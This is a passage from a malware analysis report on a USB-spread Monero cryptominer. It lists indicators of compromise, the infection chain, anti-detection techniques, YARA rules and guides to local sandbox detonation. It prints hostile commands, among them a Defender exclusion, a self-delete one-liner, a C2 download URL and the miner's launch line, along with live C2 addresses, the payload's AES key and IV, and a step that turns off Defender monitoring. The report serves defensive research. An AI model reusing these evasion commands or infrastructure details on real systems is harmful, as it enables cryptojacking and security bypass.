| **Mining Pool IP** | `91[.]206[.]169[.]76` | Mining pool server | `[CAPE]` IP traffic |
| **TLS Fingerprint** | `AFE39FE58C921511972C90ACF72937F84AD96BA4C732ECF6501540E568620C2F` | TLS cert pinning for pool | `[CAPE]` XMRig command + `[ASEC]` |
| **JA3 (C2)** | `22ed8eeca20308614de9987a1a3a2a3a` | TLS fingerprint for C2 connection | `[CAPE]` JA3 digest |
| **JA3 (Pool)** | `c216e752cae6f8755fd27f561d031636` | TLS fingerprint for mining pool | `[CAPE]` JA3 digest |
| **Spamhaus DROP** | `2.58.56.0/24`, `91.206.169.0/24` | Both IPs on Spamhaus DROP list | `[CAPE]` IDS alert + `[WEB]` |

> **Note on mining pool variation**: The ASEC report observed `r2.hashpoolpx.net`, while our CAPE sandbox captured `r3.hashpoolpx.net`. The HashPool infrastructure uses multiple subdomains (`r1`, `r2`, `r3`...) as mining pool endpoints. The specific subdomain may vary by campaign wave or config version.

### 8.2 File IOCs `[STATIC]` + `[JUJUBOX]` + `[CAPE]`

| File | MD5 | SHA256 | Detection | Source |
|------|-----|--------|-----------|--------|
| `u297528.dat` (idll.dll) | `dbd8dbecaa80795c135137d69921fdba` | `e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba` | 55/71 `[VT]` | `[STATIC]` hashed locally |
| `decrypted_payload.exe` | `e10a9bb09acb415e5dc8654b8593a45c` | `d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2` | 38/71 `[VT]` | `[STATIC]` hashed locally |
| `embedded_00.bin` (miner) | `ce527e9ec2dd83c0565796f5420ce4e4` | `5543d3b826de134bc47212be344f0c7def51704516d40f611b406c6e98baaa3a` | 8/71 `[VT]` | `[STATIC]` extracted & hashed |
| `embedded_01.bin` (dropper) | `00615f1a46899c659ad9582f43489f9f` | `2be97a48015544620fe1e3bb69b130a24ddbb31f9719173868579df489e9356c` | 54/70 `[VT]` | `[STATIC]` extracted & hashed |
| `svctrl64.exe` (dropped) | `9bfa7a2991a8b62b5ef12a920b220e1e` | `ec860277d21159deb084b7849149a3700d98dc42d7d69e2e3acceed6dbe3158e` | 57/75 `[VT]` | `[JUJUBOX]` dropped in sandbox |
| `wlogz.dat` (config) | `9de2bb040c501effa18a630ddf3db103` | `d69c801816d056c78adb6d20777edd87b02b32b3e2b87fab2f457ba54617bf60` | 0/76 `[VT]` | `[JUJUBOX]` dropped in sandbox |

### 8.3 Behavioral IOCs `[JUJUBOX]` + `[CAPE]`

| IOC | Value |
|-----|-------|
| Mutex | `decrypted_payload{ef18cb0d-aaa5-40e3-ba71-31d5ca7370fd}` |
| Dropped path | `C:\Windows\System32\svctrl64.exe` |
| Dropped path | `C:\Windows\System32\wsvcz\wlogz.dat` |
| Service DLL | `C:\Windows\System32\uXXXXXX.dll` (randomized) |
| Defender exclusion | `Add-MpPreference -ExclusionPath 'c:\windows\system32'` |
| Self-delete command | `cmd.exe /c timeout /t 5 /nobreak && del /q <path>` |
| Hiberboot disabled | `HKLM\...\Power\HiberbootEnabled = 0` |

---

## 9. Why the Wallet Is Not in the Binary `[STATIC]` + `[CAPE]` + `[ASEC]`

> **Key finding from static analysis `[STATIC]`**: Exhaustive search of all 4 binary artifacts using plaintext matching, single-byte XOR brute-force, RC4 brute-force with .data keys, uint32 pattern search, fragment search, and regex IP scanning found **zero matches** for the C2 IP `2.58.56.13`, the domains `umnsrx.net`/`umnxrc.net`, the mining pool `hashpoolpx.net`, or any `http://` URL pointing to the C2. These IOCs exist **only at runtime** — they are constructed as obfuscated stackstrings and/or stored in RC4-encrypted config blobs with dynamically computed keys. The only way to observe them is through sandbox execution `[CAPE]` `[JUJUBOX]` or ASEC intelligence `[ASEC]`.

### 9.1 The Config Retrieval Flow

Based on the combined evidence from static analysis, sandbox results, and ASEC intelligence, the wallet address retrieval works as follows:

```
1. svctrl64.exe starts as a Windows service (DcomLaunch group)

2. Connects to C2 at 2.58.56.13 / umnsrx.net
   Uses PostgreSQL database protocol (confirmed by "DB init error" string)
   
3. Sends system fingerprint (CPU, GPU, locale, geo)
   
4. Receives encrypted config containing:
   - Monero wallet address (XMR: 4[1-9A-HJ-NP-Za-km-z]{94})
   - Mining pool URL and port
   - TLS fingerprint for cert pinning
   - CPU usage limit
   - Process blacklist (monitoring tools, games)
   
5. Writes config to C:\Windows\System32\wsvcz\wlogz.dat (RC4 encrypted)
   wlogz.dat is only 32 bytes → likely an RC4 key or DB connection hash
   
6. Downloads XMRig from C2 (http://2.58.56.13/utl/xmr.dat)
   Also downloads WinRing0x64.sys kernel driver (xmrsys.dat)
   
7. Executes XMRig with decrypted config parameters:
   -o r2.hashpoolpx.net:443 --tls --tls-fingerprint=... --max-cpu-usage=50
   --user <WALLET_ADDRESS>
```

### 9.2 How to Extract the Wallet

Since the wallet is fetched from the C2 at runtime, we have 5 approaches:

**Approach 1: HTTP Config Interception (Most Reliable)**

CAPE captured the HTTP GET to `http://2.58.56.13/inf.dat` — this response contains the **wallet address in plaintext** (the config is not encrypted over HTTP). If you run the malware in a local sandbox with Wireshark:

```bash
# Capture the HTTP response to inf.dat
tshark -r capture.pcap -Y "http.content_type" -T fields -e http.file_data
# OR
tshark -r capture.pcap -Y "tcp.port == 80 && ip.addr == 2.58.56.13" -V
```

> **IMPORTANT**: The config download uses **unencrypted HTTP** (port 80), not HTTPS. The wallet address is in plaintext in the `inf.dat` response body.

**Approach 2: Memory Dump (From CAPE or Local Sandbox)**

After `svctrl64.exe` starts, dump its memory and search for the Monero address pattern:

```python
import re
with open('svctrl64_memdump.dmp', 'rb') as f:
    data = f.read()
# Monero addresses: 95 chars, starts with 4, Base58 alphabet
wallets = re.findall(rb'4[1-9A-HJ-NP-Za-km-z]{94}', data)
for w in wallets:
    print(f'[+] Wallet: {w.decode()}')
```

**Approach 3: stratum Protocol Analysis**

The TLS-pinned connection to `r3.hashpoolpx.net:443` carries the wallet in the stratum `login` field. If you can capture the TLS handshake (or the pool is accessible without cert pinning), you can extract it:

```
stratum+tcp://r3.hashpoolpx.net:443
login: <WALLET_ADDRESS>
password: x
```

**Approach 4: Network Sinkhole**

Configure your sandbox DNS to redirect `umnsrx.net` and `2.58.56.13` to a local sinkhole server that logs all requests and responses:

```bash
# Set up dnsmasq to sinkhole the C2
echo "address=/umnsrx.net/127.0.0.1" >> /etc/dnsmasq.conf
echo "address=/hashpoolpx.net/127.0.0.1" >> /etc/dnsmasq.conf
# The malware will try to connect, and you can serve your own inf.dat
# that forces the miner to use a known wallet, or log the request
```

**Approach 5: VT Premium Download**

If you have VT Premium access, download the CAPE memory dumps directly:

```python
# Download the memory dumps from CAPE analysis
for dump_sha in cape_memory_dump_hashes:
    resp = requests.get(
        f"https://www.virustotal.com/api/v3/files/{dump_sha}/download",
        headers={"x-apikey": VT_PREMIUM_KEY}
    )
    # Search for wallet in each dump
```

---

## 10. Complete Attack Chain (Full) `[STATIC]` + `[JUJUBOX]` + `[CAPE]` + `[ASEC]`

```
1. USB device inserted into Windows host
     |
2. User clicks "USB Drive.lnk" shortcut
     |
3. VBS script → BAT script executes
     |
4. BAT creates "C:\Windows \System32\" (trailing space)
   Copies u297528.dat as "printui.dll" / "idll.dll"
   Copies legitimate printui.exe to same folder
     |
5. Legitimate EXE loads idll.dll via DLL side-loading
     |
6. DllMain: DisableThreadLibraryCalls()
     |
7. IdllEntry called with param='1'
     |
8. PEB hash walking resolves ntdll.dll functions
   (seed=0xe7A1, multiplier=0x21, uppercase WCHAR)
     |
9. Syscall numbers extracted from ntdll stubs [+4 offset]
     |
10. Position-dependent XOR decodes substitution table
    formula: decoded[i] = (key ^ data[i]) ^ (0x3D*(i+1) & 0xFF)
     |
11. AES-256-CBC decrypts 6.81 MB payload
    Key: b1fa3fd02d8ec02302cf4ce7a46957f76eaaa7c5a73b3d2cb6bcb4a322593180
    IV:  815f73d17e0ab351296629a197d378a5
     |
12. Direct syscalls drop & execute decrypted payload
    NtCreateFile → NtWriteFile → NtCreateUserProcess
     |
13. Payload self-deletes (cmd.exe /c timeout /t 5 && del)
     |
14. Drops C:\Windows\System32\svctrl64.exe (miner service)
     |
15. Drops C:\Windows\System32\wsvcz\wlogz.dat (RC4-encrypted config)
     |
16. svctrl64.exe registers as Windows service (DcomLaunch)
    Service name: uXXXXXX (randomized 6 digits)
    ServiceDll: C:\Windows\System32\uXXXXXX.dll
     |
17. Adds Windows Defender exclusion via PowerShell
    Add-MpPreference -ExclusionPath 'c:\windows\system32'
     |
18. Disables Hiberboot (HiberbootEnabled = 0)
     |
19. Connects to C2 at 2.58.56.13 / umnsrx.net
    PostgreSQL database protocol
    Sends: CPU, GPU, locale, geo info
    Receives: wallet, pool URL, TLS fingerprint, config
     |
20. Downloads XMRig + WinRing0x64.sys from C2
     |
21. Executes XMRig with decrypted config:
    -o r2.hashpoolpx.net:443 --tls --tls-fingerprint=AFE39FE5...
    --max-cpu-usage=50 --user <MONERO_WALLET>
     |
22. Monero mining begins (50% CPU limit)
    Terminates if monitoring tools or games detected
     |
23. USB worm thread creates "USB Drive.lnk" on all removable drives
    Moves user files to hidden "sysvolume" folder
    Copies malware VBS/BAT/DAT to new USB devices
```

---

## 11. Anti-Detection Techniques Summary `[STATIC]` + `[CAPE]` + `[ASEC]`

| Technique | Implementation | Purpose |
|-----------|---------------|---------|
| **Hash-based API resolution** | PEB walking with custom hash (seed=0xe7A1) | Hide imports from static analysis |
| **Direct syscalls** | 6 stubs with dynamic syscall number resolution | Bypass EDR hooks on ntdll |
| **AES-256-CBC encryption** | Embedded payload encrypted in .data section | Hide the real payload |
| **Position-dependent XOR** | Arithmetic sequence constant: `(0x3D*(i+1)) & 0xFF` | Obfuscate substitution table |
| **RC4 config encryption** | Wallet/pool config encrypted with RC4 | Hide mining config |
| **Obfuscated stackstrings** | Config keys built at runtime | Evade string-based detection |
| **Self-deletion** | `cmd.exe /c timeout /t 5 && del /q` | Remove forensic evidence |
| **Windows Defender exclusion** | `Add-MpPreference -ExclusionPath` | Prevent AV scanning of install dir |
| **CPU throttling** | `--max-cpu-usage=50` | Avoid user noticing slowdown |
| **Process monitoring evasion** | Terminates when TaskMgr/ProcessExplorer running | Hide from user inspection |
| **Game detection** | Terminates when game processes running | Avoid performance complaints |
| **TLS certificate pinning** | `--tls-fingerprint=AFE39FE5...` | Prevent SSL inspection |
| **Service persistence** | DcomLaunch service with randomized name | Survive reboots, evade detection |
| **Hiberboot disable** | `HiberbootEnabled = 0` | Keep system running for mining |

---

## 12. YARA Detection Rules for Miner Components `[STATIC]`

```yara
rule printminer_dropper {
    meta:
        description = "Detects PrintMiner dropper (embedded_01.bin)"
        severity = "HIGH"
        reference = "https://asec.ahnlab.com/en/91415/"
    strings:
        $s1 = "wlogz.dat" wide
        $s2 = "wsvcz" wide
        $s3 = "CPU install error" wide
        $s4 = "GPU install error" wide
        $s5 = "Config init error" wide
        $s6 = "Infector install error" wide
        $s7 = "DB init error" wide
    condition:
        3 of them
}

rule printminer_service {
    meta:
        description = "Detects svctrl64.exe PrintMiner service component"
        severity = "HIGH"
    strings:
        $s1 = "Add-MpPreference" wide
        $s2 = "sc.exe start" wide
        $s3 = "sc.exe stop" wide
        $s4 = "DcomLaunch" wide
    condition:
        2 of them and filesize > 5MB
}

rule printminer_config {
    meta:
        description = "Detects PrintMiner wlogz.dat config file"
        severity = "MEDIUM"
    condition:
        filesize == 32
}
```

---

## 13. Tools Used `[STATIC]` + `[VT]` + `[CAPE]` + `[WEB]`

| Tool | Purpose |
|------|---------|
| `pefile` (Python) | PE parsing, section extraction, embedded PE identification |
| `VirusTotal v3 API` | File submission, detection lookup, behavioral reports |
| `pycryptodome` | AES-256-CBC decryption of payload |
| `VT Jujubox` | Dynamic behavioral analysis of decrypted payload |
| `CAPE Sandbox` (via VT) | Behavioral analysis of svctrl64.exe |
| `CAPA` (via VT) | Static capability analysis, MITRE ATT&CK mapping |
| `YARA 4.5.5` | Detection rule creation and testing |
| `strings` / regex | String extraction and pattern matching |
| `requests` (Python) | VirusTotal API interaction |

---

## 14. Local Sandbox Setup Guide — Extracting svctrl64.exe `[STATIC]` methodology

To run the dropper locally and capture `svctrl64.exe` + the wallet address from memory, you need a **Windows x64 VM** with monitoring tools. Here are three approaches:

### 14.1 Option A: CAPE Sandbox (Docker — Requires Nested VM)

CAPE is the most powerful option but requires nested virtualization:

```bash
# Step 1: Verify nested VM support
grep -E '(vmx|svm)' /proc/cpuinfo  # Must show vmx (Intel) or svm (AMD)

# Step 2: Enable KVM (if supported)
sudo modprobe kvm_intel  # or kvm_amd
ls /dev/kvm              # Should exist

# Step 3: Install Docker
sudo apt install docker.io
sudo systemctl start docker

# Step 4: Pull and run CAPE
docker pull capesandbox/cape:latest
docker run -d \
  --name cape \
  -p 8000:8000 \
  --privileged \
  -v /dev/kvm:/dev/kvm \
  capesandbox/cape:latest

# Step 5: Submit the decrypted payload via web UI
# Open http://localhost:8000
# Upload decrypted_payload.exe
# Wait for analysis (typically 10-20 minutes)

# Step 6: Download results
# The CAPE report will include:
#   - All dropped files (svctrl64.exe, wlogz.dat, WinRing0x64.sys)
#   - Memory dumps (containing decrypted wallet)
#   - PCAP (full network traffic)
#   - Process tree
#   - All registry modifications
```

**Problem**: On this system (Kali Linux, no KVM), nested virtualization is **not available**. The CAPE Docker container requires a Windows guest VM inside it, which needs hardware virtualization support.

**Workaround**: Use a physical Windows machine or a cloud VM with nested virtualization (e.g., AWS EC2 with `.metal` instances, or GCP with nested VM enabled).

### 14.2 Option B: Cuckoo Sandbox (Standalone)

Cuckoo is lighter than CAPE but requires a separate Windows VM:

```bash
# Step 1: Create a Windows 10 x64 VM (VirtualBox or QEMU)
vboxmanage createvm --name "cuckoo-guest" --register
vboxmanage modifyvm "cuckoo-guest" --memory 4096 --cpus 2
vboxmanage createvdi --filename cuckoo-guest.vdi --size 50000
# Install Windows 10 on this VM

# Step 2: Install Cuckoo
pip3 install cuckoo
cuckoo init
cuckoo community

# Step 3: Configure the VM in cuckoo.conf
# Edit ~/.cuckoo/conf/virtualbox.conf:
#   machines = cuckoo-guest
#   label = cuckoo-guest

# Step 4: Submit sample
cuckoo submit /path/to/decrypted_payload.exe

# Step 5: View report
cuckoo results  # or open web UI at http://localhost:8080
```

### 14.3 Option C: Lightweight Manual Sandbox (Recommended for Wallet Extraction)

The simplest approach — run on a real or virtual Windows machine with monitoring:

```powershell
# === PREPARATION (on Windows) ===

# 1. Disable Windows Defender real-time protection (temporarily)
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Install monitoring tools
#    - Process Monitor (ProcMon) from Sysinternals
#    - Process Explorer (to watch process tree)
#    - Wireshark (to capture network traffic)
#    - API Monitor (rohitab.com) — for syscall tracing

# === EXECUTION ===

# 3. Start Process Monitor with filter:
#    - Process Name: decrypted_payload.exe, svctrl64.exe
#    - Operation: Write, CreateFile, RegSetValue

# 4. Start Wireshark capture on all interfaces

# 5. Execute the decrypted payload
#    IMPORTANT: The DLL must be called with parameter '1'
#    rundll32.exe idll.dll,IdllEntry 1
#    OR just execute decrypted_payload.exe directly

# 6. Wait 5 seconds (the dropper self-deletes, svctrl64.exe starts)

# === EXTRACTION ===

# 7. Immediately copy svctrl64.exe from C:\Windows\System32\
Copy-Item "C:\Windows\System32\svctrl64.exe" -Destination "C:\analysis\svctrl64.exe"

# 8. Copy ALL dropped files from C:\Windows\System32\wsvcz\ 
Copy-Item "C:\Windows\System32\wsvcz\*" -Destination "C:\analysis\wsvcz\"
#    This includes:
#    - wlogz.dat (32-byte config key)
#    - u882029.exe (XMRig miner)
#    - WinRing0x64.sys (vulnerable driver)
#    - u395697.dat, u967181, u799791, u459733

# 9. Copy the service DLL
Copy-Item "C:\Windows\System32\u760237.dll" -Destination "C:\analysis\u760237.dll"

# === MEMORY DUMP FOR WALLET ===

# 10. Dump svctrl64.exe process memory (this contains the decrypted wallet)
#     Using Process Explorer:
#     Right-click svctrl64.exe -> Create Dump -> Create Mini Dump
#     OR using procdump:
procdump -ma svctrl64.exe C:\analysis\svctrl64_memdump.dmp

# 11. Search the memory dump for the Monero wallet address
#     Monero addresses start with '4' and are 95 characters long
#     They use the Base58 alphabet: [1-9A-HJ-NP-Za-km-z] (no 0, O, I, l)
python3 -c "
import re
with open('svctrl64_memdump.dmp', 'rb') as f:
    data = f.read()
# Search for Monero address pattern
matches = re.findall(rb'4[1-9A-HJ-NP-Za-km-z]{94}', data)
for m in matches:
    print(f'[+] Possible wallet: {m.decode()}')
"

# === NETWORK CAPTURE ===

# 12. In Wireshark, filter for the C2 IPs
#     ip.addr == 2.58.56.13 || ip.addr == 2.58.56.217 || ip.addr == 91.206.169.76
#     Look for:
#     - HTTP GET to 2.58.56.13/inf.dat (wallet config download)
#     - TLS connections to 2.58.56.217:443 (C2)
#     - TLS connections to 91.206.169.76:443 (mining pool)

# 13. The inf.dat HTTP response contains the wallet address in plaintext
#     Extract it from the PCAP:
tshark -r capture.pcap -Y "http.request.uri contains inf.dat" -V
```

### 14.4 Quick Approach: Emulation with QEMU + WinDbg

For a faster setup without full sandbox infrastructure:

```bash
# Step 1: Install QEMU
sudo apt install qemu-system-x86 qemu-kvm

# Step 2: Create a Windows VM disk
qemu-img create -f qcow2 win10.qcow2 50G

# Step 3: Install Windows from ISO
qemu-system-x86_64 \
  -m 4096 -smp 2 \
  -drive file=win10.qcow2,format=qcow2 \
  -cdrom Win10_x64.iso \
  -net nic -net user \
  -enable-kvm

# Step 4: After Windows is installed, boot with debugging
qemu-system-x86_64 \
  -m 4096 -smp 2 \
  -drive file=win10.qcow2,format=qcow2 \
  -net nic -net user,hostfwd=tcp::4444-:4444 \
  -enable-kvm

# Step 5: Inside the Windows VM, install WinDbg and set up kernel debugging
# Step 6: Transfer decrypted_payload.exe into the VM
# Step 7: Run the malware under WinDbg monitoring
# Step 8: When svctrl64.exe starts, break and dump memory
```

### 14.5 What Each Approach Will Yield

| Approach | svctrl64.exe | wlogz.dat | Wallet Address | PCAP | Memory Dump | Complexity |
|----------|-------------|-----------|----------------|------|-------------|------------|
| CAPE (Docker) | YES | YES | YES (from memdump) | YES | YES (9 dumps) | **Hard** (nested VM) |
| Cuckoo | YES | YES | YES (from memdump) | YES | YES | **Medium** (separate VM) |
| Manual + ProcMon | YES | YES | YES (from procdump) | YES (Wireshark) | YES (procdump) | **Easy** |
| QEMU + WinDbg | YES | YES | MAYBE | NO | YES (manual) | **Medium** |
| VT Jujubox | NO (cloud only) | NO | NO (no download) | NO | NO | **None** (cloud) |
| VT CAPE | YES (from report) | YES | MAYBE (from payload hashes) | YES | YES (hashes only) | **None** (cloud) |

### 14.6 Critical: Downloading CAPE Dropped Files from VirusTotal `[VT]`

The VT API (even with the current key) **cannot download dropped files** — that requires VT Premium (`/v3/files/{hash}/download`). However, we can check their hashes and metadata:

```python
# Verify hashes of files captured by CAPE
import requests
VT_KEY = "<REDACTED>"

# svctrl64.exe (dropped by the dropper)
resp = requests.get(
    "https://www.virustotal.com/api/v3/files/ec860277d21159deb084b7849149a370"
    "0d98dc42d7d69e2e3acceed6dbe3158e",
    headers={"x-apikey": VT_KEY}
)
print(f"Detection: {resp.json()['data']['attributes']['last_analysis_stats']}
")
# → {'malicious': 57, 'undetected': 18} (57/75)

# WinRing0x64.sys (signed vulnerable driver)
resp = requests.get(
    "https://www.virustotal.com/api/v3/files/11BD2C9F9E2397C9A16E099"
    "0E4ED2CF0679498FE0FD418A3DFDAC60B5C160EE5",
    headers={"x-apikey": VT_KEY}
)
print(f"Detection: {resp.json()['data']['attributes']['last_analysis_stats']}
")
```

To actually **download** `svctrl64.exe` and the other dropped files, you need:
1. **VT Premium account** — enables `/v3/files/{hash}/download` endpoint
2. **Manual extraction** — run the dropper in a local sandbox and copy files
3. **Malware Bazaar / Abuse.ch** — some hashes may be available for download

---

## 15. References

1. AhnLab ASEC, "CoinMiner Malware Being Continuously Distributed via USB" (Nov 2025): https://asec.ahnlab.com/en/91415/
2. AhnLab ASEC, "CoinMiner Malware Distributed via USB" (Feb 2025): https://asec.ahnlab.com/en/86221/
3. Mandiant, DIRTYBULK / CUTFAIL report (Jul 2025)
4. VirusTotal File Report — u297528.dat: https://www.virustotal.com/gui/file/e60ab99da105ee27ee09ea64ed8eb46d8edc92ee37f039dbc3e2bb9f587a33ba
5. VirusTotal File Report — decrypted_payload.exe: https://www.virustotal.com/gui/file/d59e83b0be737896dec8b91c7a52f87e16f83e911af52826b98481b5c50f32b2
6. LOLDrivers — WinRing0x64.sys: https://www.loldrivers.io/drivers/11bd2c9f-9e23-97c9-a16e-0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5/
7. Sigma Rule — Vulnerable WinRing0 Driver Load: https://github.com/SigmaHQ/sigma/blob/main/rules/windows/driver_load/driver_load_win_vuln_winring0x64.yml
